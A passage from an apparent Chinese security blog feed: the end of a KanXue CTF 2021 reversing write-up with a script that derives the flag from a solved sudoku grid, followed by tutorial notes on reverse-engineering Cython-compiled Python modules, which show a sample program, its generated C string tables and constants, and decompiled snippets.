class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>],<br> [<span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>],<br> [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>],<br> [<span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>],<br> [<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>],<br> [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>],<br> [<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]]<br></code></pre></td></tr></table></figure><p>反推输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">dict_map = &#123;&#125;<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(table1)):<br>    kk = k % <span class="hljs-number">9</span> + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> kk <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dict_map:<br>        dict_map[kk] = []<br>    dict_map[kk].append(table1[k])<br><br><span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> dict_map:<br>    print(kk, dict_map[kk])<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    cnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> instance[y][x] == <span class="hljs-number">0</span>:<br>            flag = flag + <span class="hljs-built_in">chr</span>(dict_map[result[y][x]][y])<br>            cnt = cnt + <span class="hljs-number">1</span> <br>    flag = flag + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>) - cnt)<br>print(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;看雪CTF2021&quot;&gt;&lt;a href=&quot;#看雪CTF2021&quot; class=&quot;headerlink&quot; title=&quot;看雪CTF2021&quot;&gt;&lt;/a&gt;看雪CTF2021&lt;/h1&gt;&lt;h2 id=&quot;第二题-南冥神功&quot;&gt;&lt;a href=&quot;#第二题-南冥神功&quot; class=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Cython Reverse</title>
    <link href="https://panda0s.top/2021/05/07/Cython-Reverse/"/>
    <id>https://panda0s.top/2021/05/07/Cython-Reverse/</id>
    <published>2021-05-07T11:56:04.000Z</published>
    <updated>2021-05-13T14:07:31.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cython-Reverse-notes"><a href="#Cython-Reverse-notes" class="headerlink" title="Cython Reverse notes"></a>Cython Reverse notes</h1><p>Cython 是什么呢？官方给出的解释是 Cython 是一种新的语言，是带类型的 Python [1]。</p><p>Cython 有一个功能叫 <code>Cythonize</code> 这个功能可以将 Python 编译成 C语言实现，再由 GCC/Clang 将 C 编译成动态库。</p><p>setup.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup<br><span class="hljs-keyword">from</span> Cython.Build <span class="hljs-keyword">import</span> cythonize<br><br>setup(<br>    ext_modules = cythonize(<span class="hljs-string">&quot;hello.pyx&quot;</span>, annotate=<span class="hljs-literal">True</span>)<br>)<br></code></pre></td></tr></table></figure><p>annotate=True 选项可以生成一个 html 页面，用于显示 Py源码与生成的C代码的对应关系。</p><p>build 命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> build_ext --inplace<br></code></pre></td></tr></table></figure><p>Build 成功后，可以在当前目录下找到对应的动态库与对应的 xxx.c 源文件。此时可以直接用 python import 导入（就像导入编译之前的那样）</p><p>Cythonize 好处是编译成本地代码后执行效率可以提高，缺点是不太好<code>逆向</code></p><p>本文分析基于 Python 3.7.6，Cython 0.29.21</p><p>本文基于 Hello.py 编译成的动态库分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myfunc1</span>():</span><br>    print(<span class="hljs-string">&quot;This is myfunc1.&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_variables</span>():</span><br>    x = <span class="hljs-number">5</span><br>    y = <span class="hljs-string">&quot;variables test.&quot;</span><br>    print(x)<br>    print(y)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_strVar</span>():</span><br>    x = <span class="hljs-string">&quot;Hello world.&quot;</span><br>    print(x)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_global_var</span>():</span><br>    <span class="hljs-keyword">global</span> gy<br>    print(gy)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_cast</span>():</span><br>    x = <span class="hljs-built_in">int</span>(<span class="hljs-number">5</span>)<br>    y = <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>)<br>    print(x, y)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_numbers</span>():</span><br>    x = <span class="hljs-number">123</span><br>    y = <span class="hljs-number">12.3</span><br>    z = <span class="hljs-number">0x112233445566778899AABBCCDD</span><br>    print(x, y, z)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_if</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">456</span>:<br>        print(<span class="hljs-string">&quot;x &gt; 456&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;x &lt;= 456&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_string</span>():</span><br>    x = <span class="hljs-string">&quot;I am str.&quot;</span><br>    y = <span class="hljs-built_in">len</span>(x)<br>    z = x[<span class="hljs-number">1</span>]<br>    w = x[<span class="hljs-number">2</span>:]<br>    print(x, y, z, w)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;am&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(<span class="hljs-string">&quot;yes&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;wrong&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_list</span>():</span><br>    x = <span class="hljs-built_in">list</span>()<br>    x.append(<span class="hljs-number">1</span>)<br>    x.append(<span class="hljs-number">2</span>)<br>    x.append(<span class="hljs-number">3</span>)<br>    x.append(<span class="hljs-number">4</span>)<br>    x.append(<span class="hljs-string">&quot;five&quot;</span>)<br>    print(x)<br>    print(<span class="hljs-built_in">len</span>(x))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>        print(i)<br>    x = x[<span class="hljs-number">1</span>:]<br>    x[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] = [<span class="hljs-number">22</span>, <span class="hljs-number">33</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_dict</span>():</span><br>    x = &#123;&#125;<br>    x[<span class="hljs-string">&quot;one&quot;</span>] = <span class="hljs-number">1</span><br>    x[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br>    x[<span class="hljs-string">&quot;three&quot;</span>] = <span class="hljs-number">3</span><br>    y = x[<span class="hljs-string">&quot;one&quot;</span>]<br>    z = x[<span class="hljs-string">&quot;two&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;one&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(y)<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> x:<br>        print(k, x[k])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_for</span>():</span><br>    s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>        s = s + i<br>    print(s)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_while</span>():</span><br>    s = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> i &lt;= <span class="hljs-number">100</span>:<br>        s = s + i<br>        i += <span class="hljs-number">1</span><br>    print(s)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_exception</span>():</span><br>    x = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        x = x + <span class="hljs-string">&quot;1&quot;</span><br>        print(x)<br>    <span class="hljs-keyword">except</span> NameError:<br>        print(<span class="hljs-string">&quot;Variable x is not defined&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&quot;Something else went wrong&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_datetime</span>():</span><br>    x = datetime.datetime.now()<br>    print(x)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_format</span>():</span><br>    x = <span class="hljs-number">1</span><br>    y = <span class="hljs-string">&quot;One&quot;</span><br>    z = <span class="hljs-string">&quot;%s is %d&quot;</span> % (y, x)<br>    print(z)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_math</span>():</span><br>    x = math.ceil(<span class="hljs-number">1.4</span>)<br>    y = math.floor(<span class="hljs-number">1.4</span>)<br><br>    print(x) <span class="hljs-comment"># returns 2</span><br>    print(y) <span class="hljs-comment"># returns 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_arg</span>(<span class="hljs-params">x, y, z</span>):</span><br>    x = x + <span class="hljs-number">1</span><br>    y = y + <span class="hljs-string">&quot;2&quot;</span><br>    z = z[:]<br>    print(x, y, z)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test_class</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.aa = <span class="hljs-number">1</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_class_hh</span>(<span class="hljs-params">self</span>):</span><br>        print(self.aa)<br><br>    <br><br>gy = <span class="hljs-number">123</span><br>myfunc1()<br>test_variables()<br>test_strVar()<br>test_global_var()<br>test_cast()<br>test_numbers()<br>test_string()<br>test_list()<br>test_dict()<br>test_for()<br>test_while()<br>test_exception()<br>test_datetime()<br>test_format()<br>test_math()<br>test_arg(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;2&quot;</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])<br><br></code></pre></td></tr></table></figure><h2 id="字符串表-pyx-string-tab"><a href="#字符串表-pyx-string-tab" class="headerlink" title="字符串表 __pyx_string_tab"></a>字符串表 __pyx_string_tab</h2><p>字符串表算是 Cython 动态库逆向非常重要的一个入口了，字符串表记录 Python 代码中引用的字符串。</p><p>在 hello.c 源文件中可以找到 __pyx_string_tab</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>PyObject **p; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *s; <br>                <span class="hljs-keyword">const</span> Py_ssize_t n; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* encoding;<br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> is_unicode; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> is_str; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> intern; <br>               &#125; __Pyx_StringTabEntry;<br><br><span class="hljs-keyword">static</span> PyObject *__pyx_kp_s_1;<br><span class="hljs-keyword">static</span> PyObject *__pyx_kp_s_Hello_world;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __pyx_k_1[] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __pyx_k_Hello_world[] = <span class="hljs-string">&quot;Hello world.&quot;</span>;<br><br><br><span class="hljs-keyword">static</span> __Pyx_StringTabEntry __pyx_string_tab[] = &#123;<br>  &#123;&amp;__pyx_kp_s_1, __pyx_k_1, <span class="hljs-keyword">sizeof</span>(__pyx_k_1), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>  &#123;&amp;__pyx_kp_s_Hello_world, __pyx_k_Hello_world, <span class="hljs-keyword">sizeof</span>(__pyx_k_Hello_world), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>  &#123;&amp;__pyx_kp_s_I_am_str, __pyx_k_I_am_str, <span class="hljs-keyword">sizeof</span>(__pyx_k_I_am_str), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>  &#123;&amp;__pyx_n_s_NameError, __pyx_k_NameError, <span class="hljs-keyword">sizeof</span>(__pyx_k_NameError), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,<br>    ......<br>  &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;<br>&#125;<br><br>__Pyx_InitStrings(__pyx_string_tab)<br></code></pre></td></tr></table></figure><p><code>__pyx_string_tab</code> 将 <code>PyObject</code> 与对应的字符串关联起来，最后调用 <code>__Pyx_InitStrings</code> 初始化所有字符串对象。</p><p>在 IDA 逆向分析时，查找字符串引用，可以快速定位到<code>__pyx_string_tab</code> ，然后根据 <code>__Pyx_StringTabEntry</code> 定位程序对某个字符串 <code>PyObject</code> 的引用。</p><img src="/2021/05/07/Cython-Reverse/image-20210507215019652.png" class="" title="image-20210507215019652"><h2 id="整数常量的构造"><a href="#整数常量的构造" class="headerlink" title="整数常量的构造"></a>整数常量的构造</h2><p>整数在 Cython 里面也是 <code>PyObject</code>，整数常量属于全局变量，在 <code>__Pyx_InitGlobals</code> 中初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">__pyx_float_1_4 = PyFloat_FromDouble(<span class="hljs-number">1.4</span>); <br>__pyx_int_0 = PyInt_FromLong(<span class="hljs-number">0</span>);<br>__pyx_int_1 = PyInt_FromLong(<span class="hljs-number">1</span>);<br>__pyx_int_2 = PyInt_FromLong(<span class="hljs-number">2</span>);<br>__pyx_int_3 = PyInt_FromLong(<span class="hljs-number">3</span>);<br>__pyx_int_4 = PyInt_FromLong(<span class="hljs-number">4</span>);<br>__pyx_int_5 = PyInt_FromLong(<span class="hljs-number">5</span>);<br>__pyx_int_6 = PyInt_FromLong(<span class="hljs-number">6</span>);<br>__pyx_int_22 = PyInt_FromLong(<span class="hljs-number">22</span>);<br>__pyx_int_33 = PyInt_FromLong(<span class="hljs-number">33</span>);<br>__pyx_int_100 = PyInt_FromLong(<span class="hljs-number">100</span>);<br>__pyx_int_123 = PyInt_FromLong(<span class="hljs-number">123</span>);<br>__pyx_int_1357463230989497419223659171037 = PyInt_FromString((<span class="hljs-keyword">char</span> *)<span class="hljs-string">&quot;1357463230989497419223659171037&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_myfunc1(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_2test_variables(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_4test_strVar(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_6test_global_var(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_8test_cast(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_10test_numbers(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_12test_if(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_14test_string(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_16test_list(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_18test_dict(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_20test_for(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_22test_while(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_24test_exception(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_26test_datetime(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_28test_format(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_30test_math(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_32test_arg(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x, PyObject *__pyx_v_y, PyObject *__pyx_v_z); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_10test_class___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_10test_class_2test_class_hh(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); <span class="hljs-comment">/* proto */</span><br></code></pre></td></tr></table></figure><p>重点看一下 <code>__pyx_pf_5hello_32test_arg</code> 与 <code>__pyx_pf_5hello_10test_class_2test_class_hh</code></p><p><code>__pyx_pf_5hello_32test_arg</code> 的 py 定义是 <code>def test_arg(x, y, z)</code> 因此多了几个参数。</p><p><code>__pyx_pf_5hello_10test_class_2test_class_hh</code> 是类函数 test_class.test_class_hh , 所以有一个 self 参数。</p><h2 id="myfunc1-分析"><a href="#myfunc1-分析" class="headerlink" title="myfunc1() 分析"></a>myfunc1() 分析</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">PyObject *__cdecl <span class="hljs-title">PyObject_Call</span><span class="hljs-params">(PyObject *callable_object, PyObject *args, PyObject *kw)</span></span>;<br><br>v0 = PyTuple_Pack(<span class="hljs-number">1LL</span>, __pyx_kp_s_This_is_myfunc1); <span class="hljs-comment">// args</span><br>v2 = PyObject_GetAttr(__pyx_b, __pyx_n_s_print) <span class="hljs-comment">// __pyx_b -&gt; PyImport_AddModule(&quot;builtins&quot;);</span><br>PyObject_Call(v2, v1, <span class="hljs-number">0LL</span>)<br></code></pre></td></tr></table></figure><h2 id="test-variables-分析"><a href="#test-variables-分析" class="headerlink" title="test_variables() 分析"></a>test_variables() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myfunc1</span>():</span><br>    print(<span class="hljs-string">&quot;This is myfunc1.&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = __pyx_kp_s_variables_test; <span class="hljs-comment">// 引用字符串</span><br>x = PyLong_FromLong(<span class="hljs-number">5LL</span>);<br><br><span class="hljs-comment">// 调用 print</span><br>args = PyTuple_Pack(<span class="hljs-number">1LL</span>, x);<br>v6 = PyObject_GetAttr(__pyx_b, __pyx_n_s_print);<br>PyObject_Call(v6, args, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure><h2 id="test-global-var-分析"><a href="#test-global-var-分析" class="headerlink" title="test_global_var() 分析"></a>test_global_var() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_global_var</span>():</span><br>    <span class="hljs-keyword">global</span> gy<br>    print(gy)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = PyObject_GetAttr(__pyx_b, __pyx_n_s_gy); <span class="hljs-comment">// 从当前模块查找globals</span><br><br><span class="hljs-comment">// 调用 